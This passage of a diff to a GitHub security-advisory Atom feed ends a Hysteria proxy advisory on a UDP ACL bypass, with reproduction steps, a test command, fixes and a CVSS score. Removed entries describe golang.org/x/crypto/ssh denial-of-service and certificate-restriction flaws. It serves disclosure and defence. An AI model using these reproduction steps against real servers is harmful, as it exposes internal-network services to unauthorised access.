+<p>Steps:</p>
+<ol>
+<li>Start one UDP echo service on <code>127.0.0.1:&lt;allowedPort&gt;</code>.</li>
+<li>Start another UDP echo service on a real RFC1918 address of the server host.</li>
+<li>Connect an authenticated Hysteria client and create one UDP session.</li>
+<li>Send a packet to the allowed loopback destination first.</li>
+<li>Reuse the same UDP session and send a packet to the RFC1918 destination.</li>
+</ol>
+<p>Observed result:</p>
+<ul>
+<li>The private-address packet is relayed successfully and receives a reply.</li>
+</ul>
+<p>Expected result:</p>
+<ul>
+<li>The packet should be rejected by ACL.</li>
+</ul>
+<h2 id="poc-and-local-evidence">PoC and local evidence</h2>
+<p>A local integration test file was added during verification:</p>
+<ul>
+<li><code>core/internal/integration_tests/udp_private_acl_bypass_test.go</code></li>
+</ul>
+<p>The two tests are:</p>
+<ul>
+<li><code>TestClientServerUDPACLBYPASSLoopback</code></li>
+<li><code>TestClientServerUDPACLBYPASSPrivateIPv4</code></li>
+</ul>
+<p>They can be executed with:</p>
+<pre><code class="language-bash">go test ./core/internal/integration_tests -run 'TestClientServerUDPACLBYPASS(Loopback|PrivateIPv4)' -count=1
+</code></pre>
+<p>The tests pass locally and demonstrate that a destination blocked by ACL becomes reachable after the session is established with an allowed first destination.</p>
+<h2 id="suggested-fixes">Suggested fixes</h2>
+<p>Any of the following would address the issue:</p>
+<ol>
+<li>Re-evaluate ACL and outbound policy for every defragmented UDP packet before forwarding it with <code>WriteTo</code>.</li>
+<li>Alternatively, enforce a single immutable destination per UDP session and reject destination changes after the first packet.</li>
+<li>Ensure logging and policy hooks are aligned with the chosen model so that policy enforcement and observability reflect the real per-packet destination.</li>
+</ol>
+<h2 id="severity-assessment">Severity assessment</h2>
+<p>Suggested CVSS v3.1 vector: <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L</code></p>
+<p>This reflects a network-reachable issue with low attack complexity, requiring only an authenticated client, no victim interaction, and allowing impact beyond the proxy process by exposing localhost and internal-network UDP resources from the server's trust boundary.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apernet/hysteria/security/advisories/GHSA-vgrc-hq28-p3xp">https://github.com/apernet/hysteria/security/advisories/GHSA-vgrc-hq28-p3xp</a></li>
+<li><a href="https://github.com/advisories/GHSA-vgrc-hq28-p3xp">https://github.com/advisories/GHSA-vgrc-hq28-p3xp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vgrc-hq28-p3xp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T19:48:50.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/umputun/remark42] Remark42: Cross-Site Scripting (XSS) on /api/v1/img via content-type spoofing]]></title>
         <id>https://github.com/advisories/GHSA-4c8j-mgm4-qqvp</id>
@@ -1506,127 +2262,5 @@ incus file push "${tmpdir}/afrw-rootfs-symlink" afrw-rootfs-symlink/
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-06-25T22:21:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh: Invoking pathological RSA/DSA parameters may cause DoS]]></title>
-        <id>https://github.com/advisories/GHSA-w879-237q-wc7r</id>
-        <link href="https://github.com/advisories/GHSA-w879-237q-wc7r"/>
-        <updated>2026-06-25T22:18:45.000Z</updated>
-        <content type="html"><![CDATA[<p>The RSA and DSA public key parsers did not enforce size limits on key parameters. A crafted public key with an excessively large modulus or DSA parameter could cause several minutes of CPU consumption during signature verification. This could be triggered by unauthenticated clients during public key authentication. RSA moduli are now limited to 8192 bits, and DSA parameters are validated per FIPS 186-2.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39829">https://nvd.nist.gov/vuln/detail/CVE-2026-39829</a></li>
-<li><a href="https://go.dev/cl/781641">https://go.dev/cl/781641</a></li>
-<li><a href="https://go.dev/cl/781661">https://go.dev/cl/781661</a></li>
-<li><a href="https://go.dev/issue/79565">https://go.dev/issue/79565</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5018">https://pkg.go.dev/vuln/GO-2026-5018</a></li>
-<li><a href="https://github.com/advisories/GHSA-w879-237q-wc7r">https://github.com/advisories/GHSA-w879-237q-wc7r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w879-237q-wc7r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T22:18:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh: Invoking client can cause server deadlock on unexpected responses]]></title>
-        <id>https://github.com/advisories/GHSA-vgwf-h737-ff37</id>
-        <link href="https://github.com/advisories/GHSA-vgwf-h737-ff37"/>
-        <updated>2026-06-25T22:18:18.000Z</updated>
-        <content type="html"><![CDATA[<p>A malicious SSH peer could send unsolicited global request responses to fill an internal buffer, blocking the connection's read loop. The blocked goroutine could not be released by calling Close(), resulting in a resource leak per connection. Unsolicited global responses are now discarded.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39830">https://nvd.nist.gov/vuln/detail/CVE-2026-39830</a></li>
-<li><a href="https://go.dev/cl/781640">https://go.dev/cl/781640</a></li>
-<li><a href="https://go.dev/cl/781664">https://go.dev/cl/781664</a></li>
-<li><a href="https://go.dev/issue/79564">https://go.dev/issue/79564</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5017">https://pkg.go.dev/vuln/GO-2026-5017</a></li>
-<li><a href="https://github.com/advisories/GHSA-vgwf-h737-ff37">https://github.com/advisories/GHSA-vgwf-h737-ff37</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vgwf-h737-ff37</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-25T22:18:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh: Invoking memory leak when rejecting channels can lead to DoS]]></title>
-        <id>https://github.com/advisories/GHSA-qpw4-5x99-6vjp</id>
-        <link href="https://github.com/advisories/GHSA-qpw4-5x99-6vjp"/>
-        <updated>2026-06-25T22:15:44.000Z</updated>
-        <content type="html"><![CDATA[<p>An authenticated SSH client that repeatedly opened channels which were rejected by the server caused unbounded memory growth, eventually crashing the server process and affecting all connected users. Rejected channels are now properly removed from the connection's internal state and released for garbage collection.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39827">https://nvd.nist.gov/vuln/detail/CVE-2026-39827</a></li>
-<li><a href="https://go.dev/cl/781320">https://go.dev/cl/781320</a></li>
-<li><a href="https://go.dev/issue/35127">https://go.dev/issue/35127</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5016">https://pkg.go.dev/vuln/GO-2026-5016</a></li>
-<li><a href="https://github.com/advisories/GHSA-qpw4-5x99-6vjp">https://github.com/advisories/GHSA-qpw4-5x99-6vjp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qpw4-5x99-6vjp</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T22:15:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh is vulnerable to invoking server panic during CheckHostKey/Authenticate flow]]></title>
-        <id>https://github.com/advisories/GHSA-78mq-xcr3-xm33</id>
-        <link href="https://github.com/advisories/GHSA-78mq-xcr3-xm33"/>
-        <updated>2026-06-25T22:15:17.000Z</updated>
-        <content type="html"><![CDATA[<p>SSH servers which use CertChecker as a public key callback without setting IsUserAuthority or IsHostAuthority could be caused to panic by a client presenting a certificate. CertChecker now returns an error instead of panicking when these callbacks are nil.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39835">https://nvd.nist.gov/vuln/detail/CVE-2026-39835</a></li>
-<li><a href="https://go.dev/cl/781660">https://go.dev/cl/781660</a></li>
-<li><a href="https://go.dev/issue/79563">https://go.dev/issue/79563</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5015">https://pkg.go.dev/vuln/GO-2026-5015</a></li>
-<li><a href="https://github.com/advisories/GHSA-78mq-xcr3-xm33">https://github.com/advisories/GHSA-78mq-xcr3-xm33</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-78mq-xcr3-xm33</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T22:15:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh vulnerable to invoking bypass of certificate restrictions]]></title>
-        <id>https://github.com/advisories/GHSA-45gg-vh54-h5m9</id>
-        <link href="https://github.com/advisories/GHSA-45gg-vh54-h5m9"/>
-        <updated>2026-06-25T22:14:39.000Z</updated>
-        <content type="html"><![CDATA[<p>When an SSH server authentication callback returned PartialSuccessError with non-nil Permissions, those permissions were silently discarded, potentially dropping certificate restrictions such as force-command after a second factor succeeded. Returning non-nil Permissions with PartialSuccessError now results in a connection error.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39828">https://nvd.nist.gov/vuln/detail/CVE-2026-39828</a></li>
-<li><a href="https://go.dev/cl/781621">https://go.dev/cl/781621</a></li>
-<li><a href="https://go.dev/issue/79562">https://go.dev/issue/79562</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5014">https://pkg.go.dev/vuln/GO-2026-5014</a></li>
-<li><a href="https://github.com/advisories/GHSA-45gg-vh54-h5m9">https://github.com/advisories/GHSA-45gg-vh54-h5m9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-45gg-vh54-h5m9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T22:14:38.000Z</published>
     </entry>
 </feed>
